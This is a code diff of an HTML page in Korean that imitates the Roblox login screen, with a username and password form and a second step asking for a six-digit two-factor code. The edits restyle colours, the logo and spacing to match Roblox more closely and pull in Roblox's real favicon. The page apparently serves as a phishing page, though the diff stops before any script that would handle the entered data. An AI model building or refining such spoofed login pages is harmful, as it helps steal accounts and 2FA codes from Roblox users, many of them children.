@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox에 로그인</title>
+    <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
@@ -14,10 +15,10 @@
             min-height: 100vh;
         }
         
-        /* 헤더 */
+        /* 헤더 - Roblox 스타일 */
         .header {
             background: #191a1f;
-            padding: 0 20px;
+            padding: 0 24px;
             height: 56px;
             display: flex;
             align-items: center;
@@ -40,9 +41,10 @@
         .header-left {
             display: flex;
             align-items: center;
-            gap: 24px;
+            gap: 28px;
         }
         
+        /* Roblox 로고 - 검정색 스타일 */
         .roblox-logo {
             display: flex;
             align-items: center;
@@ -51,14 +53,13 @@
         }
         
         .logo-box {
-            width: 36px;
-            height: 36px;
-            background: #00b4d8;
+            width: 34px;
+            height: 34px;
+            background: #000;
             border-radius: 6px;
             display: flex;
             align-items: center;
             justify-content: center;
-            border: 2px solid #fff;
             flex-shrink: 0;
         }
         
@@ -69,16 +70,16 @@
             border-radius: 2px;
         }
         
-        .logo-text-white {
+        .logo-text {
             font-size: 20px;
             font-weight: 800;
             color: #fff;
-            letter-spacing: 0;
+            letter-spacing: -0.3px;
         }
         
         .nav-links {
             display: flex;
-            gap: 20px;
+            gap: 24px;
             list-style: none;
         }
         
@@ -98,7 +99,7 @@
         }
         
         .btn-signup {
-            background: #00b4d8;
+            background: #000;
             color: #fff;
             border: none;
             padding: 8px 20px;
@@ -108,9 +109,9 @@
             cursor: pointer;
         }
         
-        .btn-signup:hover { background: #0098b8; }
+        .btn-signup:hover { background: #333; }
         
-        /* 메인 */
+        /* 메인 콘텐츠 */
         .main-content {
             min-height: calc(100vh - 56px);
             display: flex;
@@ -129,21 +130,24 @@
             max-width: 400px;
         }
         
+        /* 카드 상단 검정색 Roblox 로고 */
         .card-logo {
             text-align: center;
             margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
         }
         
         .card-logo-icon {
             display: inline-block;
-            width: 44px;
-            height: 44px;
-            background: #00b4d8;
+            width: 40px;
+            height: 40px;
+            background: #000;
             border-radius: 8px;
-            border: 2px solid #fff;
-            vertical-align: middle;
-            margin-right: 6px;
             position: relative;
+            flex-shrink: 0;
         }
         
         .card-logo-icon::after {
@@ -151,19 +155,19 @@
             position: absolute;
             top: 10px;
             left: 10px;
-            width: 24px;
-            height: 24px;
+            width: 20px;
+            height: 20px;
             background: #fff;
-            border-radius: 4px;
+            border-radius: 3px;
         }
         
         .card-logo-text {
-            font-size: 26px;
+            font-size: 28px;
             font-weight: 800;
             color: #000;
-            vertical-align: middle;
         }
         
+        /* 폼 스타일 */
         .form-group {
             margin-bottom: 20px;
         }
@@ -188,14 +192,14 @@
         
         .form-group input:focus {
             outline: none;
-            border-color: #00b4d8;
+            border-color: #000;
             background: #fff;
         }
         
         .login-btn {
             width: 100%;
             padding: 14px;
-            background: #2a2a2a;
+            background: #000;
             color: #fff;
             border: none;
             border-radius: 8px;
@@ -205,7 +209,7 @@
             margin-top: 8px;
         }
         
-        .login-btn:hover { background: #111; }
+        .login-btn:hover { background: #333; }
         
         .divider {
             text-align: center;
@@ -255,9 +259,10 @@
         }
         
         .links a {
-            color: #00b4d8;
+            color: #000;
             text-decoration: none;
             font-size: 14px;
+            font-weight: 600;
         }
         
         .links a:hover { text-decoration: underline; }
@@ -310,17 +315,18 @@
         }
         
         .code-inputs input:focus {
-            border-color: #00b4d8;
+            border-color: #000;
             outline: none;
         }
         
         .link-btn {
             background: none;
             border: none;
-            color: #00b4d8;
+            color: #000;
             cursor: pointer;
             font-size: 14px;
             margin-top: 12px;
+            font-weight: 600;
         }
         
         .link-btn:hover { text-decoration: underline; }
@@ -384,7 +390,7 @@
                 <div class="logo-box">
                     <div class="logo-box-inner"></div>
                 </div>
-                <span class="logo-text-white">Roblox</span>
+                <span class="logo-text">Roblox</span>
             </a>
             <ul class="nav-links">
                 <li><a href="#">차트</a></li>
@@ -402,11 +408,13 @@
 <div class="main-content">
     <div class="login-card">
         
+        <!-- 검정색 Roblox 로고 -->
         <div class="card-logo">
             <span class="card-logo-icon"></span>
             <span class="card-logo-text">Roblox</span>
         </div>
         
+        <!-- 1단계: 로그인 -->
         <div id="step1">
             <form id="loginForm" onsubmit="return false;">
                 <div class="error-msg" id="errorMsg">사용자 이름 또는 비밀번호가 잘못되었습니다. 다시 시도하세요.</div>
@@ -438,6 +446,7 @@
             </div>
         </div>
         
+        <!-- 2단계: 2FA -->
         <div id="step2fa">
             <div class="tfa-title">2단계 인증</div>
             <p class="info-text">인증 앱 또는 이메일로 전송된 6자리 코드를 입력하세요.</p>
@@ -498,8 +507,8 @@
 <!-- 쿠키 배너 -->
 <div style="position:fixed;bottom:0;left:0;right:0;background:#222;color:#fff;padding:12px 20px;text-align:center;font-size:13px;z-index:10000;display:flex;align-items:center;justify-content:center;flex-wrap:wrap;gap:8px;">
     <span>Roblox는 더 나은 환경을 제공하기 위해 쿠키를 사용합니다.</span>
-    <a href="#" style="color:#00b4d8;text-decoration:underline;">자세히 알아보기</a>
-    <button onclick="this.parentElement.style.display='none'" style="background:#00b4d8;color:#fff;border:none;padding:6px 16px;border-radius:4px;cursor:pointer;">동의</button>
+    <a href="#" style="color:#fff;text-decoration:underline;">자세히 알아보기</a>
+    <button onclick="this.parentElement.style.display='none'" style="background:#000;color:#fff;border:none;padding:6px 16px;border-radius:4px;cursor:pointer;">동의</button>
 </div>
 
 <script>
